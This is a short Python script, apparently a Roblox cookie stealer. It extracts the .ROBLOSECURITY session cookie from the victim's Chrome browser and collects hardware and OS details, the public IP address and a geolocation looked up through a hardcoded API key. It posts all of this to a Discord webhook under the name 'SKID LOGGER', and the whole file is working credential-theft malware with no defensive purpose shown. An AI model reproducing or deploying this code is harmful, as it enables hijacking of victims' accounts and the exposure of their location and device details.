import browser_cookie3, requests, threading, discord_webhook, platform
import platform,socket,re,uuid,json,psutil,logging


info={}
info['platform']=platform.system()
info['platform-release']=platform.release()
info['platform-version']=platform.version()
info['architecture']=platform.machine()
info['hostname']=socket.gethostname()
info['ip-address']=socket.gethostbyname(socket.gethostname())
info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
info['processor']=platform.processor()
info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"

ip = requests.get('https://api.ipify.org').text



key = '8afd579c95c744178f55abd5ea6ed29d'



r = requests.get('https://ipgeolocation.abstractapi.com/v1/?api_key=' + key + '&ip_address=' + ip)
data = r.json()
city = data['city']
state = data['region']
contry = data['country']


webhook = 'WEBHOOK HERE'

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'SKID LOGGER', 'content':f"""
        
Roblox Cookie:

```SKIDS COOKIE: {cookie}```
        
System Info:
```
Ram: {info['ram']}
CPU: {info['processor']}
OS:  {info['platform']}
```

Ip info:
```
IP: {ip}
City: {city}
State: {state}
Country: {contry}
```"""})
    except:
        pass
browsers = [chrome_logger]

for x in browsers:
    threading.Thread(target=x,).start()
